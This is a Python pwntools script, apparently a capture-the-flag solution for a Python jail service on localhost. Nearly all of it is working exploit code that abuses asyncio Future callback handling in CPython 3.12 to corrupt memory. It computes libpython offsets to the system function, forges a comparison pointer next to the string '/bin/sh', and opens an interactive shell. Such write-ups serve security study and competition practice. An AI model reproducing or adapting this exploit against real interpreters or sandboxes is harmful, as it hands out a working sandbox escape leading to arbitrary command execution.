from pwn import *

REMOTE = True

libpython = ELF("./libpython3.12.so.1.0" if REMOTE else "/home/tchen/.pyenv/versions/3.12.7/lib/libpython3.12.so.1.0") 

offset = libpython.symbols["_PyRuntime"] + 3304 - libpython.symbols["plt.system"]

ans = f"""
def toByte(i):
{"\n".join(['    if i=={n}: return b"\\x{n:02x}"'.format(n=n) for n in range(256) ])}
def toBytes(n, i):
    global toByte
    res = b""
    for x in (0,1,2,3,4,5,6,7) if n == 8 else (0,1,2,3,4,5,6):
        res += toByte(i % 0x100) 
        i //= 0x100
    return res

NotImplemented = future("__le__", "")

class Base:
    def __eq__(self, other):
        global pad
        return not other == pad

class Evil(Base):
    def __eq__(self, other):
        global Base, NotImplemented, targetConv
        future("remove_done_callback", Base())
        del other
        v = b"/bin/sh\\x00" + targetConv
        return NotImplemented

richcompare = toBytes(8, id(1)-{hex(offset)})
targetAddr = id(richcompare)-0xc8+0x20
targetConv = toBytes(7, targetAddr)

pad = NotImplemented 

future("add_done_callback", pad)
future("add_done_callback", Base())
future("remove_done_callback", pad)
future("remove_done_callback", Evil())
""".strip().replace("\n\n","\n")

io = remote("localhost", 5000) if REMOTE else process(["/home/tchen/.pyenv/versions/3.12.7/bin/python", "-S", "jail.py"])


for line in ans.split("\n"):
    io.sendlineafter(b">>> ", line.encode())

io.sendafter(b">>> ", b"\n\n")
io.interactive()